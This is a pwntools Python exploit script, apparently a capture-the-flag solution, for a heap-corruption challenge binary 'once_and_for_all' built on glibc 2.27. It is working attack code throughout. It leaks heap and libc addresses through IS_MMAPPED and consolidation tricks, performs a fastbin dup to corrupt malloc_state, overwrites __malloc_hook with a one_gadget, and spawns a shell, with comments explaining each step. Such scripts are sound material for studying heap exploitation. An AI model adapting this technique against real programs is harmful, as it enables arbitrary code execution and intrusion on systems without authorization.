#!/usr/bin/env python3

from pwn import *

the_binary = "./once_and_for_all"
context.binary = the_binary
elf = context.binary
libc = ELF("./glibc/libc.so.6", checksec=False)

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("138.68.189.179", 30154)
elif args.STRACE:
    io = process(["strace", "-o", "trace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, """
        # free() in fix
        # pie break 0xff2
        continue
    """)

def choice(num):
    io.sendlineafter(b"> ", str(num).encode())

def index(idx):
    io.sendlineafter(b"index: ", str(idx).encode())

def small_alloc(idx, data, sz=None):
    choice(1)
    index(idx)

    if sz is None:
        sz = len(data)
    else:
        assert len(data) <= sz + 1

    io.sendlineafter(b"for it: ", str(sz).encode())
    io.sendafter(b"details: ", data)

def big_alloc(sz):
    assert 0x5af < sz <= 0xf5c0
    choice(4)
    io.sendlineafter(b"weapon: ", str(sz).encode())

def fix(idx, data, sz=None, verify=False, send_details=True):
    choice(2)
    index(idx)

    if sz is None:
        sz = len(data)
    else:
        assert len(data) <= sz + 1

    io.sendlineafter(b"repair: ", str(sz).encode())

    if not send_details:
        return

    io.sendafter(b"details: ", data)

    if verify:
        io.sendlineafter(b">> ", b"1")
    else:
        io.sendlineafter(b">> ", b"2")

def examine(idx):
    choice(3)
    index(idx)

small_alloc(0, b"A"*0x38)
small_alloc(1, b"B"*0x38)
small_alloc(2, b"C"*0x38)

fix(2, b"c"*0x28)
fix(1, b"b"*0x28)
fix(0, b"a"*0x28)

# Set the IS_MMAPPED bit on a fastbin chunk so we can leak its heap fd pointer.
#
# See: https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3461
small_alloc(3, b"E"*0x38 + p8(0x43), sz=0x38)
fix(2, b"F", sz=0x38, verify=True)
raw_leak = io.recvuntil(b"\n\n", drop=True)
heap_leak = u64(raw_leak.ljust(8, b"\x00"))
heap_base = heap_leak - 0x546
log.info("Heap leak: %#x" % heap_leak)
log.info("Heap base: %#x" % heap_base)

# Clear a PREV_INUSE bit to force backward consolidation into a printable chunk.
# We also have to setup pointers in the chunk-to-be-backwards-consolidated-with
# to pass the P->FD->bk == P and P->BK->fd == P checks in the unlink macro.
#
# See: https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L1409
small_alloc(4, b"G"*0x38)
small_alloc(5, b"H"*0x38)
small_alloc(6, b"I"*0x38)
k_chunk = heap_base + 0x6b0
small_alloc(7, b"J"*0x10 + p64(k_chunk) + p64(k_chunk), sz=0x38)

j_chunk = heap_base + 0x740
fix(5, b"h"*0x28)
small_alloc(8, p64(j_chunk) + p64(j_chunk) + b"K"*0x20 + p64(0x40) + p8(0x40), sz=0x38)
fix(6, b"i"*0x28)

# We use our one permitted big allocation to trigger fastbin consolidation,
# which will merge two 0x40-sized chunks into the smallbin (one of these
# chunks is still in use by the program). This will link libc pointers to the
# front of user section of the chunk still being used by the program, providing
# a libc leak.
big_alloc(0x1000)
examine(8)
raw_leak = io.recvuntil(b"\n\n", drop=True)
libc_leak = u64(raw_leak.ljust(8, b"\x00"))
libc.address = libc_leak - 0x3ebd10
log.info("libc leak: %#x" % libc_leak)
log.info("libc base: %#x" % libc.address)

# A side effect of our backwards consolidation is that indexes 8 and 9 now point
# to the same chunk, setting conditions for a double-free scenario.
small_alloc(9, b"L"*0x38)

first_fake_fast_fastbinsY = libc.address + 0x3ebc50
second_fake_fast_fastbinsY = first_fake_fast_fastbinsY + 0x38

fix(8, b"k"*0x28)
# Prevent double-free detection.
fix(4, b"g"*0x18 + p64(0x41) + p64(first_fake_fast_fastbinsY))
fix(9, b"l"*0x28)

# We start our fastbin dup attack by forging a fake fastbin at the end of the 
# user section of one of our 0x40-sized heap chunks. This will allow us to
# overwrite the fd pointer of a freed 0x30-sized chunk (which we will in turn
# use to forge a fake fastbin chunk header in the fastbinsY array in libc).
fake_fast_in_g_chunk = heap_base + 0x17e0
fix(8, b"K"*0x38)
fix(4, p64(fake_fast_in_g_chunk - 0x10) + b"G"*0x30)
fix(9, b"L"*0x38)
small_alloc(10, b"N"*0x38)
small_alloc(11, p64(0xdeadbeef) + p64(0x31) + p64(0x41), sz=0x38)
# After the below allocation, the fake fd pointer 0x41 should now be linked
# into the corresponding fastbinsY entry in libc's malloc_state. This will
# allow us to allocate a chunk overlapping part of fastbinsY via a forged
# chunk in the 0x40-sized fastbin.
small_alloc(12, b"o"*0x28)

# We can now clobber the pointers stored in fastbinsY, including the head
# of the 0x40-sized fastbin that we can allocate out of. We are too far
# away from malloc_state->top to overwrite it at this point; instead, we
# forge another fastbin chunk closer to malloc_state->top and point the
# head of the 0x40-sized fastbin there.
#
# We also set the IS_MMAPPED on this fake chunk to prevent calloc from
# clearing all of the doubly-linked bin list heads in malloc_state.
small_alloc(13, p64(second_fake_fast_fastbinsY) + b"\x00"*0x28 + p64(0x43), sz=0x38)

# We now trigger an allocation from the 0x40 fastbin, which will give us
# a chunk overlapping malloc_state->top, which we set to the location of
# our desired write. We do this at a misaligned offset before __malloc_hook
# to pass some sanity checks on the top chunk's size.
fix(12, b"\x00"*8 + p64(libc.sym.__malloc_hook - 5 - 0x10), sz=0x38)

# One gadget that has the main constraint [rsp+0x40] == NULL:
#
# 0004f322  488b057fbb3900     mov     rax, qword [rel __environ]
# 0004f329  488d3d6a4b1600     lea     rdi, [rel data_1b3e9a]  {"/bin/sh"}
# 0004f330  488d742440         lea     rsi, [rsp+0x40 {var_158}]
# 0004f335  c705a1e239000000…  mov     dword [rel data_3ed5e0], 0x0
# 0004f33f  c7059be239000000…  mov     dword [rel data_3ed5e4], 0x0
# 0004f349  488b10             mov     rdx, qword [rax]
# 0004f34c  e8df5a0900         call    execve
one_gadget = libc.address + 0x4f322

# Another allocation should give us a chunk on top of __malloc_hook, which we
# overwrite with our one gadget.
fix(1, b"B"*5 + p64(one_gadget), sz=0x38)

# Trigger a malloc() call, which gets redirected to the overwritten __malloc_hook.
fix(0, b"C"*0x38, send_details=False)

io.interactive()
